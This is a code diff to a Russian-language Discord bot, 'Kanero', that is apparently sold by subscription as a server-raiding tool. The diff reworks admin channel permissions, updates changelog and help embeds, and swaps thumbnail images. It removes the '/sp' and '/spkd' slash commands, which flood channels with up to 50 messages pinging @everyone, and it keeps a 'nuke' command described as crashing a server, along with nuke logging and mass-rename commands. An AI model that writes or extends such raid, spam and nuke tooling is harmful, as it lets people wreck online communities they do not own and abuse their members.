@@ -1642,12 +1642,11 @@ async def setup(ctx):
         role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
     logs_ch = await guild.create_text_channel("📊・logs", category=cat_admin, overwrites=admin_ow(), topic="Логи нюков — !nukelogs")
-    await guild.create_text_channel("🤝・friend-chat", category=cat_admin, overwrites={
+    await guild.create_text_channel("💬・admin-chat", category=cat_admin, overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
-        role_white: _ow(), role_premium: _ow(),
-        role_friend: _ow(True, True),
+        role_white: _ow(), role_premium: _ow(), role_friend: _ow(),
         role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="Чат для 🤝 Friend")
+    }, topic="Чат для Owner и Developer")
 
     # ── 5. Контент в каналы ──
 
@@ -1775,40 +1774,51 @@ async def setup_update(ctx):
             except Exception:
                 pass
 
-    # 4. ADMIN каналы — все видят, только Owner+ пишет
-    admin_cat = discord.utils.find(lambda c: "ADMIN" in c.name, guild.categories)
-    if admin_cat:
-        for ch in admin_cat.channels:
-            try:
-                ow = {guild.default_role: discord.PermissionOverwrite(read_messages=False)}
-                for r in guild.roles:
-                    if r.name in ("👑 Owner", "🔧 Developer", "🤖 Kanero"):
-                        ow[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
-                    elif r.name in ("👤 Guest", "👥 User", "✅ White", "💎 Premium", "🛡️ Moderator"):
-                        ow[r] = discord.PermissionOverwrite(read_messages=True, send_messages=False)
-                await ch.edit(overwrites=ow)
-            except Exception:
-                pass
-        results.append("✅ ADMIN права обновлены")
-
-    # 5. Статистика
-    try:
-        await update_stats_channels(guild)
-        results.append("✅ Статистика обновлена")
-    except Exception as e:
-        results.append(f"❌ Статистика: {e}")
-
-    # 6. Создаём отсутствующие каналы
+    # 4. ADMIN — обновляем права и создаём admin-chat если нет
     def _ow(read=False, write=False):
         return discord.PermissionOverwrite(read_messages=read, send_messages=write)
 
-    role_owner = discord.utils.find(lambda r: r.name == "👑 Owner", guild.roles)
-    role_dev   = discord.utils.find(lambda r: r.name == "🔧 Developer", guild.roles)
-    role_guest = discord.utils.find(lambda r: r.name == "👤 Guest", guild.roles)
-    role_user  = discord.utils.find(lambda r: r.name == "� User", guild.roles)
-    role_white = discord.utils.find(lambda r: r.name == "✅ White", guild.roles)
-    role_prem  = discord.utils.find(lambda r: r.name == "💎 Premium", guild.roles)
+    role_owner  = discord.utils.find(lambda r: r.name == "👑 Owner",    guild.roles)
+    role_dev    = discord.utils.find(lambda r: r.name == "🔧 Developer", guild.roles)
+    role_guest  = discord.utils.find(lambda r: r.name == "👤 Guest",    guild.roles)
+    role_user   = discord.utils.find(lambda r: r.name == "👥 User",     guild.roles)
+    role_white  = discord.utils.find(lambda r: r.name == "✅ White",    guild.roles)
+    role_prem   = discord.utils.find(lambda r: r.name == "💎 Premium",  guild.roles)
+    role_friend = discord.utils.find(lambda r: r.name == "🤝 Friend",   guild.roles)
 
+    admin_cat = discord.utils.find(lambda c: "ADMIN" in c.name, guild.categories)
+    if admin_cat:
+        # Обновляем права существующих каналов
+        for ch in admin_cat.channels:
+            if "admin-chat" in ch.name.lower():
+                continue  # admin-chat обрабатываем отдельно
+            try:
+                ow = {guild.default_role: discord.PermissionOverwrite(read_messages=False)}
+                for r in guild.roles:
+                    if r.name in ("� Owner", "� Developer", "🤖 Kanero"):
+                        ow[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
+                await ch.edit(overwrites=ow)
+            except Exception:
+                pass
+        # Создаём admin-chat если нет
+        existing_names = [ch.name.lower() for ch in admin_cat.channels]
+        if not any("admin-chat" in n for n in existing_names):
+            try:
+                ow = {guild.default_role: _ow()}
+                if role_guest:  ow[role_guest]  = _ow(False, False)
+                if role_user:   ow[role_user]   = _ow(False, False)
+                if role_white:  ow[role_white]  = _ow(False, False)
+                if role_prem:   ow[role_prem]   = _ow(False, False)
+                if role_friend: ow[role_friend] = _ow(False, False)
+                if role_owner:  ow[role_owner]  = _ow(True, True)
+                if role_dev:    ow[role_dev]    = _ow(True, True)
+                await guild.create_text_channel("💬・admin-chat", category=admin_cat, overwrites=ow, topic="Чат для Owner и Developer")
+                results.append("✅ Создан 💬・admin-chat")
+            except Exception as e:
+                results.append(f"❌ admin-chat: {e}")
+        results.append("✅ ADMIN обновлён")
+
+    # 5. Создаём отсутствующие каналы в ОСНОВНОЕ
     cat_main = discord.utils.find(lambda c: "ОСНОВНОЕ" in c.name, guild.categories)
     if cat_main:
         existing = [ch.name.lower() for ch in cat_main.channels]
@@ -1827,11 +1837,9 @@ async def setup_update(ctx):
                 if role_owner: ow[role_owner] = _ow(True, True)
                 if role_dev:   ow[role_dev]   = _ow(True, True)
                 await guild.create_text_channel(ch_name, category=cat_main, overwrites=ow, topic=topic)
-                results.append(f"✅ Создан канал {ch_name}")
+                results.append(f"✅ Создан {ch_name}")
             except Exception as e:
-                results.append(f"❌ Канал {ch_name}: {e}")
-    else:
-        results.append("⚠️ Категория ОСНОВНОЕ не найдена — каналы не созданы")
+                results.append(f"❌ {ch_name}: {e}")
 
     # 7. Обновляем позиции ролей
     try:
@@ -2122,6 +2130,8 @@ async def ticket_setup(ctx):
         await ctx.message.delete()
     except Exception:
         pass
+
+@bot.command(name="goout")
 async def goout(ctx):
     """Бот покидает сервер где написана команда. Только для овнера."""
     if ctx.author.id != config.OWNER_ID:
@@ -2169,7 +2179,7 @@ async def announce(ctx):
         color=0x0a0a0a
     )
     embed.set_footer(text="☠️ Kanero  |  Нажми кнопку чтобы начать")
-    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
 
     await ctx.send(embed=embed, view=GetAccessView())
     try:
@@ -2710,17 +2720,19 @@ async def changelog(ctx):
             "• 🌟 Fame переименована в 🤝 Friend\n"
             "• Friend стоит над 💎 Premium\n\n"
             "**Каналы:**\n"
-            "• 🤝・friend-chat в ADMIN — только Friend+\n\n"
+            "• 🤝・admin-chat в ADMIN — только Friend+\n\n"
             "**Нюки:**\n"
             "• Удаление и создание каналов параллельно — быстрее\n"
             "• Овнер всегда может остановить любой нюк\n\n"
             "**Логи:**\n"
-            "• Бот пишет в 📊・logs при каждом нюке автоматически"
+            "• Бот пишет в 📊・logs при каждом нюке автоматически\n\n"
+            "**Удалено:**\n"
+            "• `/sp` и `/spkd` — команды убраны"
         ),
         inline=False
     )
     embed.set_footer(text="☠️ Kanero  |  discord.gg/JhQtrCtKFy  |  !changelogall — вся история")
-    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
     await ctx.send(embed=embed)
 
 
@@ -2765,15 +2777,16 @@ async def changelogall(ctx):
         name="🔥 v2.2",
         value=(
             "• 🌟 Fame → 🤝 Friend, стоит над 💎 Premium\n"
-            "• 🤝・friend-chat в ADMIN\n"
+            "• 🤝・admin-chat в ADMIN\n"
             "• Нюки быстрее — удаление и создание параллельно\n"
             "• Овнер всегда останавливает любой нюк\n"
-            "• Авто-лог в 📊・logs при каждом нюке"
+            "• Авто-лог в 📊・logs при каждом нюке\n"
+            "• Удалены `/sp` и `/spkd`"
         ),
         inline=False
     )
     embed.set_footer(text="☠️ Kanero  |  discord.gg/JhQtrCtKFy  |  текущая версия: v2.2")
-    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
     await ctx.send(embed=embed)
 
 
@@ -2834,9 +2847,7 @@ async def help_cmd(ctx):
             "`!rename [название]` — переименовать каналы\n"
             "`!nicks_all [ник]` — сменить ники всем\n"
             "`!webhooks` — список вебхуков\n"
-            "`!inv` — ссылка для добавления бота\n"
-            "`/sp [кол-во] [текст]` — спам\n"
-            "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
+            "`!inv` — ссылка для добавления бота"
         ),
         inline=False
     )
@@ -2881,7 +2892,7 @@ async def help_cmd(ctx):
         inline=False
     )
     embed.set_footer(text="☠️ Kanero  |  !changelogall — вся история  |  v2.2")
-    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
     await ctx.send(embed=embed)
 
 
@@ -3595,7 +3606,7 @@ async def on_message(message):
                 inline=False
             )
             embed.set_footer(text="☠️ Kanero  |  !changelog — история обновлений")
-            embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+            embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
             await message.channel.send(embed=embed)
             return
 
@@ -3696,7 +3707,7 @@ async def on_message(message):
                 inline=False
             )
             embed.set_footer(text="☠️ Kanero  |  v2.0  |  Команды работают только в ЛС")
-            embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+            embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
             await message.channel.send(embed=embed)
             return
 
@@ -4150,55 +4161,6 @@ async def on_ready():
 
     # ── SLASH: доступны всем вайтлист ──────────────────────
 
-    @bot.tree.command(name="sp", description="☠️ Спам сообщением")
-    @app_commands.describe(count="Количество (макс 50)", text="Текст сообщения")
-    @app_commands.allowed_installs(guilds=True, users=True)
-    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
-    @app_commands.checks.cooldown(1, 300, key=lambda i: (i.user.id, i.channel_id))
-    async def sp(interaction: discord.Interaction, count: int, text: str):
-        await interaction.response.defer(ephemeral=True)
-        if not is_whitelisted(interaction.user.id):
-            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
-            await interaction.followup.send(embed=embed, ephemeral=True); return
-        if count > 50:
-            await interaction.followup.send("❌ Максимум 50.", ephemeral=True); return
-        mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
-        await interaction.followup.send(f"💀 Запускаю спам: **{count}** сообщений.", ephemeral=True)
-        for _ in range(count):
-            try:
-                await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
-                await asyncio.sleep(0.5)
-            except discord.HTTPException as e:
-                if e.status == 429:
-                    await asyncio.sleep(e.retry_after + 0.5)
-            except Exception:
-                pass
-
-    @bot.tree.command(name="spkd", description="☠️ Спам с задержкой")
-    @app_commands.describe(delay="Задержка в секундах", count="Количество (макс 50)", text="Текст сообщения")
-    @app_commands.allowed_installs(guilds=True, users=True)
-    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
-    async def spkd(interaction: discord.Interaction, delay: int, count: int, text: str):
-        await interaction.response.defer(ephemeral=True)
-        if not is_whitelisted(interaction.user.id):
-            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
-            await interaction.followup.send(embed=embed, ephemeral=True); return
-        if count > 50:
-            await interaction.followup.send("❌ Максимум 50.", ephemeral=True); return
-        if delay < 0:
-            await interaction.followup.send("❌ Задержка не может быть отрицательной.", ephemeral=True); return
-        mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
-        await interaction.followup.send(f"💀 Запускаю спам: **{count}** сообщений, задержка **{delay}с**.", ephemeral=True)
-        for _ in range(count):
-            try:
-                await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
-            except discord.HTTPException as e:
-                if e.status == 429:
-                    await asyncio.sleep(e.retry_after + 0.5)
-            except Exception:
-                pass
-            await asyncio.sleep(max(delay, 0.5))
-
     @bot.tree.command(name="nuke", description="💀 Краш сервера")
     @app_commands.allowed_installs(guilds=True, users=True)
     @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
@@ -4482,7 +4444,7 @@ async def on_ready():
                 inline=False
             )
         embed.set_footer(text=f"☠️ Kanero  |  v2.0  |  {'💎 Premium активен' if pm else 'Нет Premium? Пиши: davaidkatt'}")
-        embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+        embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
     await bot.tree.sync()
